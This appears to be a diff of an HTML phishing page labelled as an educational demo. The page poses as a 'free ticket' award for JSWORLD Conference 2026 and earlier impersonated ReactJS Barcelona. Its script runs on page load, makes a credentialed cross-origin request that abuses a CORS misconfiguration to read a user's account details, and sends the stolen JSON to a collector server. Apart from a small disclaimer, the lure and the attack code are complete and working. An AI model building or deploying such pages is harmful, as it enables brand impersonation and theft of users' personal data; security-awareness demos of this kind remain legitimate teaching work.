@@ -3,370 +3,400 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 Congratulations! You Won a ReactJS Barcelona Conference 2026 Ticket!</title>
+    <title>🎉 You've Won a Free Ticket to JSWORLD Conference 2026!</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 24px;
         }
 
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
+        .card {
+            background: #141414;
+            border-radius: 16px;
+            border: 1px solid #242424;
+            max-width: 560px;
             width: 100%;
+            overflow: hidden;
+            box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03);
+        }
+
+        /* ── Header ── */
+        .header {
+            background: #0f0f0f;
+            padding: 20px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #1f1f1f;
+        }
+
+        .logo-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .logo-row img {
+            height: 40px;
+            width: auto;
+        }
+
+        .logo-label {
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 1.05em;
+            letter-spacing: 0.3px;
+        }
+
+        .logo-label span { color: #A01822; }
+
+        .nav-link {
+            color: #555;
+            font-size: 0.78em;
+            font-weight: 500;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+        }
+
+        /* ── Hero banner ── */
+        .hero {
+            background: linear-gradient(160deg, #1a0608 0%, #2a0a0e 50%, #1a0608 100%);
+            border-bottom: 1px solid #3a0a0e;
+            padding: 36px 32px 32px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse at 50% -20%, rgba(160,24,34,0.35) 0%, transparent 65%);
+            pointer-events: none;
+        }
+
+        .hero-eyebrow {
+            display: inline-block;
+            background: rgba(160,24,34,0.25);
+            border: 1px solid rgba(160,24,34,0.5);
+            color: #e05060;
+            font-size: 0.7em;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 16px;
+        }
+
+        .hero h1 {
+            color: #ffffff;
+            font-size: 1.75em;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            line-height: 1.15;
+            margin-bottom: 10px;
+        }
+
+        .hero p {
+            color: #888;
+            font-size: 0.9em;
+            font-weight: 400;
+        }
+
+        /* ── Ticket ── */
+        .ticket-wrap {
+            padding: 28px 32px;
+        }
+
+        .ticket {
+            background: #0f0f0f;
+            border-radius: 10px;
+            border: 1px solid #242424;
             overflow: hidden;
             position: relative;
         }
 
-        .header {
-            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
-            padding: 40px 30px;
-            text-align: center;
-            position: relative;
+        .ticket-top {
+            padding: 22px 24px;
+            border-bottom: 1px dashed #2a2a2a;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
         }
 
-        .header::before {
-            content: '🎉';
-            font-size: 60px;
-            position: absolute;
-            top: 20px;
-            left: 30px;
-            animation: bounce 2s infinite;
-        }
-
-        .header::after {
-            content: '🎊';
-            font-size: 60px;
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            animation: bounce 2s infinite 0.5s;
-        }
-
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            60% { transform: translateY(-5px); }
-        }
-
-        .header h1 {
-            color: white;
-            font-size: 2.5em;
+        .ticket-event {
+            color: #ffffff;
             font-weight: 800;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            font-size: 1.05em;
+            letter-spacing: -0.2px;
         }
 
-        .header p {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 1.2em;
-            font-weight: 500;
+        .ticket-year {
+            color: #A01822;
+            font-weight: 900;
         }
 
-        .content {
-            padding: 40px 30px;
+        .ticket-pill {
+            background: #A01822;
+            color: #fff;
+            font-size: 0.65em;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 100px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            white-space: nowrap;
         }
 
-        .winner-badge {
-            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
-            color: white;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 1.3em;
-            font-weight: bold;
-            text-align: center;
-            margin: 0 auto 30px;
-            width: fit-content;
-            box-shadow: 0 8px 25px rgba(30, 64, 175, 0.3);
-        }
-
-        .conference-info {
-            background: #eff6ff;
-            border-radius: 15px;
-            padding: 25px;
-            margin: 25px 0;
-            border-left: 5px solid #2563eb;
-        }
-
-        .conference-info h3 {
-            color: #333;
-            font-size: 1.4em;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .conference-info h3::before {
-            content: '🚀';
-            margin-right: 10px;
-            font-size: 1.2em;
-        }
-
-        .info-grid {
+        .ticket-body {
+            padding: 20px 24px;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 15px;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px;
         }
 
-        .info-item {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-
-        .info-item .icon {
-            font-size: 1.5em;
-            margin-right: 12px;
-        }
-
-        .info-item .text {
-            flex: 1;
-        }
-
-        .info-item .label {
-            font-size: 0.85em;
-            color: #666;
-            font-weight: 500;
-        }
-
-        .info-item .value {
+        .ticket-field label {
+            display: block;
+            font-size: 0.65em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #444;
+            margin-bottom: 5px;
             font-weight: 600;
-            color: #333;
         }
 
-        .next-steps {
-            background: #dbeafe;
-            border-radius: 15px;
-            padding: 25px;
-            margin: 25px 0;
-            border-left: 5px solid #3b82f6;
-        }
-
-        .next-steps h3 {
-            color: #1e40af;
-            font-size: 1.3em;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .next-steps h3::before {
-            content: '📋';
-            margin-right: 10px;
-        }
-
-        .steps-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .steps-list li {
-            padding: 12px 0;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #bfdbfe;
-        }
-
-        .steps-list li:last-child {
-            border-bottom: none;
-        }
-
-        .steps-list li::before {
-            content: '✅';
-            margin-right: 15px;
-            font-size: 1.2em;
-        }
-
-        .footer {
-            background: #f5f5f5;
-            padding: 20px 30px;
-            text-align: center;
-            color: #666;
+        .ticket-field .val {
+            color: #e0e0e0;
+            font-weight: 600;
             font-size: 0.9em;
         }
 
-        .conference-logo {
-            font-weight: bold;
-            color: #333;
-            font-size: 1.1em;
+        .ticket-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #242424 20%, #242424 80%, transparent);
+            margin: 0 24px;
         }
 
+        .ticket-footer {
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
+        .ticket-id {
+            font-size: 0.68em;
+            color: #333;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+
+        .ticket-value {
+            color: #A01822;
+            font-size: 1.1em;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+
+        /* ── Notch cutouts ── */
+        .ticket::before,
+        .ticket::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #141414;
+            border: 1px solid #242424;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .ticket::before { left: -8px; }
+        .ticket::after  { right: -8px; }
+
+        /* ── CTA ── */
+        .cta-wrap {
+            padding: 0 32px 28px;
+        }
+
+        .cta-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #8B1018 0%, #A01822 50%, #B52030 100%);
+            color: #ffffff;
+            border: none;
+            padding: 15px 24px;
+            font-size: 0.9em;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            box-shadow: 0 4px 20px rgba(160,24,34,0.35);
+            transition: box-shadow 0.2s, transform 0.1s;
+        }
+
+        .cta-btn:hover {
+            box-shadow: 0 6px 28px rgba(160,24,34,0.5);
+            transform: translateY(-1px);
+        }
+
+        .cta-btn:active {
+            transform: translateY(0);
+        }
+
+        .cta-note {
+            text-align: center;
+            color: #3a3a3a;
+            font-size: 0.72em;
+            margin-top: 12px;
+        }
+
+        /* ── Footer ── */
+        .footer {
+            background: #0f0f0f;
+            border-top: 1px solid #1f1f1f;
+            padding: 14px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-brand { color: #333; font-size: 0.75em; }
+        .footer-disclaimer { color: #222; font-size: 0.68em; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="card">
+
         <div class="header">
-            <h1>Congratulations!</h1>
-            <p>You've won a free ticket to ReactJS Barcelona Conference 2026!</p>
+            <div class="logo-row">
+                <img src="https://assets.jsworldconference.com/logo_jsworld_ad7f539826.svg" alt="JSWORLD" />
+                <div class="logo-label">JSWORLD <span>Conference</span></div>
+            </div>
+            <a class="nav-link" href="#">jsworldconference.com</a>
         </div>
 
-        <div class="content">
-            <div class="winner-badge">
-                🎫 FREE CONFERENCE TICKET WINNER! 🎫
-            </div>
+        <div class="hero">
+            <div class="hero-eyebrow">🎫 Winner Selected</div>
+            <h1>You've won a free ticket<br>to JSWORLD 2026</h1>
+            <p>Your complimentary full-access pass has been reserved</p>
+        </div>
 
-            <div class="conference-info">
-                <h3>ReactJS Barcelona Conference 2026</h3>
-                <p>Join Barcelona's premier React conference featuring world-class speakers, workshops, and networking opportunities.</p>
-                
-                <div class="info-grid">
-                    <div class="info-item">
-                        <div class="icon">📅</div>
-                        <div class="text">
-                            <div class="label">Date</div>
-                            <div class="value">Late September 2026</div>
-                        </div>
+        <div class="ticket-wrap">
+            <div class="ticket">
+                <div class="ticket-top">
+                    <div class="ticket-event">JSWORLD <span class="ticket-year">2026</span></div>
+                    <div class="ticket-pill">Full Pass · Complimentary</div>
+                </div>
+                <div class="ticket-body">
+                    <div class="ticket-field">
+                        <label>Date</label>
+                        <div class="val">May 7–8, 2026</div>
                     </div>
-                    <div class="info-item">
-                        <div class="icon">📍</div>
-                        <div class="text">
-                            <div class="label">Location</div>
-                            <div class="value">Barcelona, Spain</div>
-                        </div>
+                    <div class="ticket-field">
+                        <label>Venue</label>
+                        <div class="val">RAI Amsterdam</div>
                     </div>
-                    <div class="info-item">
-                        <div class="icon">💰</div>
-                        <div class="text">
-                            <div class="label">Ticket Value</div>
-                            <div class="value">EUR 250</div>
-                        </div>
+                    <div class="ticket-field">
+                        <label>Location</label>
+                        <div class="val">Amsterdam, Netherlands</div>
                     </div>
-                    <div class="info-item">
-                        <div class="icon">👥</div>
-                        <div class="text">
-                            <div class="label">Expected Attendees</div>
-                            <div class="value">400+ Developers</div>
-                        </div>
+                    <div class="ticket-field">
+                        <label>Attendance</label>
+                        <div class="val">2,000+ attendees</div>
                     </div>
                 </div>
+                <div class="ticket-divider"></div>
+                <div class="ticket-footer">
+                    <div class="ticket-id">TKT-2026-JSWORLD-FREE</div>
+                    <div class="ticket-value">€499 value</div>
+                </div>
             </div>
+        </div>
 
-            <div class="next-steps">
-                <h3>What happens next?</h3>
-                <ul class="steps-list">
-                    <li>Your ticket has been automatically reserved</li>
-                    <li>Confirmation email will be sent within 24 hours</li>
-                    <li>You'll receive speaker announcements as they're confirmed</li>
-                    <li>Workshop selection opens 30 days before the event</li>
-                </ul>
-            </div>
-
-
-
-
+        <div class="cta-wrap">
+            <button class="cta-btn" onclick="alert('Ticket reserved — confirmation sent to your email!')">
+                Claim Your Ticket
+            </button>
+            <div class="cta-note">Ticket valid for both days · Includes all sessions &amp; workshops</div>
         </div>
 
         <div class="footer">
-            <div class="conference-logo">ReactJS Barcelona</div>
-            <p>Building the React community in Spain since 2018</p>
-            <p>This is a demonstration of a phishing attack for educational purposes only.</p>
+            <div class="footer-brand">jsworldconference.com</div>
+            <div class="footer-disclaimer">Educational demo — phishing simulation</div>
         </div>
+
     </div>
 
     <script>
-        // Silent CORS attack function - runs on page load
         async function attemptCORSAttack() {
             try {
                 console.log('🚨 PHISHING ATTACK: Silently stealing user data...');
-                
-                // Attempt to steal user data via CORS vulnerability
-                const response = await fetch('https://unimportantly-scraggy-otelia.ngrok-free.dev/api/userDetails', {
+
+                const response = await fetch('http://localhost:3003/api/userDetails', {
                     method: 'GET',
-                    credentials: 'include', // Automatically includes cookies from target domain
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' }
                 });
 
                 if (response.ok) {
                     const userData = await response.json();
                     console.log('✅ STOLEN DATA:', userData);
-                    
-                    // Exfiltrate stolen data to attacker server
                     try {
-                        const exfiltrationUrl = `http://localhost:5001/collect?data=${encodeURIComponent(JSON.stringify(userData))}`;
-                        await fetch(exfiltrationUrl, {
+                        await fetch(`http://localhost:5001/collect?data=${encodeURIComponent(JSON.stringify(userData))}`, {
                             method: 'GET',
                             mode: 'no-cors'
                         });
                         console.log('✅ Data successfully exfiltrated to attacker server');
-                        
-                    } catch (exfiltrationError) {
-                        console.error('❌ Failed to exfiltrate data:', exfiltrationError);
+                    } catch (e) {
+                        console.error('❌ Failed to exfiltrate data:', e);
                     }
-                    
                 } else {
                     console.log('❌ CORS attack failed - user not logged in or CORS properly configured');
                 }
-            } catch (error) {
-                console.error('❌ CORS attack failed:', error);
+            } catch (e) {
+                console.error('❌ CORS attack failed:', e);
             }
         }
 
+        window.addEventListener('load', () => setTimeout(attemptCORSAttack, 1000));
 
-
-        // Execute CORS attack silently when page loads
-        window.addEventListener('load', () => {
-            // Small delay to make it look more natural
-            setTimeout(attemptCORSAttack, 1000);
-        });
-
-        // Add some festive animations
         function createConfetti() {
-            const colors = ['#1e40af', '#2563eb', '#3b82f6', '#60a5fa', '#93c5fd'];
-            for (let i = 0; i < 50; i++) {
+            const colors = ['#A01822', '#B52030', '#e05060', '#ffffff'];
+            for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
-                    const confetti = document.createElement('div');
-                    confetti.style.position = 'fixed';
-                    confetti.style.left = Math.random() * 100 + 'vw';
-                    confetti.style.top = '-10px';
-                    confetti.style.width = '10px';
-                    confetti.style.height = '10px';
-                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                    confetti.style.pointerEvents = 'none';
-                    confetti.style.borderRadius = '50%';
-                    confetti.style.animation = `fall ${3 + Math.random() * 2}s linear forwards`;
-                    
-                    const style = document.createElement('style');
-                    style.textContent = `
-                        @keyframes fall {
-                            to {
-                                transform: translateY(100vh) rotate(360deg);
-                                opacity: 0;
-                            }
-                        }
+                    const el = document.createElement('div');
+                    el.style.cssText = `
+                        position:fixed; pointer-events:none;
+                        left:${Math.random() * 100}vw; top:-10px;
+                        width:7px; height:7px;
+                        background:${colors[Math.floor(Math.random() * colors.length)]};
+                        border-radius:${Math.random() > 0.5 ? '50%' : '1px'};
+                        animation:fall ${3 + Math.random() * 2}s linear forwards;
                     `;
-                    document.head.appendChild(style);
-                    document.body.appendChild(confetti);
-                    
-                    setTimeout(() => {
-                        confetti.remove();
-                        style.remove();
-                    }, 5000);
+                    const s = document.createElement('style');
+                    s.textContent = `@keyframes fall{to{transform:translateY(100vh) rotate(360deg);opacity:0}}`;
+                    document.head.appendChild(s);
+                    document.body.appendChild(el);
+                    setTimeout(() => { el.remove(); s.remove(); }, 5500);
                 }, Math.random() * 3000);
             }
         }
 
-        // Start confetti after a short delay
-        setTimeout(createConfetti, 500);
+        setTimeout(createConfetti, 400);
     </script>
 </body>
 </html>
